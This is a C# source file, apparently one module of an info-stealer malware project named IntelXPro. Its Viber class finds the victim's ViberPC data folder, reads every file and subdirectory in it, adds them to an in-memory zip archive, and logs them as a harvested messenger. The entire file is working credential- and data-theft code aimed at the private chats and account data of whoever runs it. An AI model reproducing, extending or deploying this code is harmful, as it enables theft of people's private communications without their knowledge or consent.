using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Viber : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ViberPC", "data");
            if (Directory.Exists(text))
            {
                string entry = "Viber";
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Viber";
                Array.ForEach(Directory.GetFiles(text), delegate (string file)
                {
                    zip.AddFile(entry + "\\" + Path.GetFileName(file), File.ReadAllBytes(file));
                });
                Array.ForEach(Directory.GetDirectories(text), delegate (string dir)
                {
                    zip.AddDirectoryFiles(dir, entry);
                });
                counterApplications.Files.Add(text + " => " + entry);
                counterApplications.Files.Add(entry);
                counter.Messangers.Add(counterApplications);
            }
        }
    }
}
